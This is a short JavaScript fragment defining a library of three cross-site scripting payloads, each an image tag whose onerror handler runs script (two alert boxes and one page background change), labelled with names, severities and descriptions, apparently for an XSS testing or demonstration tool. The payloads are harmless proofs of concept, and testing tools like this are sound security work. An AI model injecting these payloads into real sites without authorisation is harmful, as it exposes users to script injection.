// ===========================================================
// Payload Library
// ===========================================================

const payloadLibrary = {

    alert: {
        name: "Basic Alert",
        severity: "Medium",
        description: "Triggers JavaScript using image onerror event.",
        payload: "<img src=x onerror=alert('XSS')>"
    },

    img: {
        name: "Image Event XSS",
        severity: "High",
        description: "Browser fails loading image and executes JavaScript.",
        payload: "<img src=x onerror=\"alert('Image XSS')\">"
    },

    style: {
        name: "DOM Manipulation",
        severity: "High",
        description: "Changes page styling to prove DOM execution.",
        payload: "<img src=x onerror=\"document.body.style.background='red'\">"
    }
};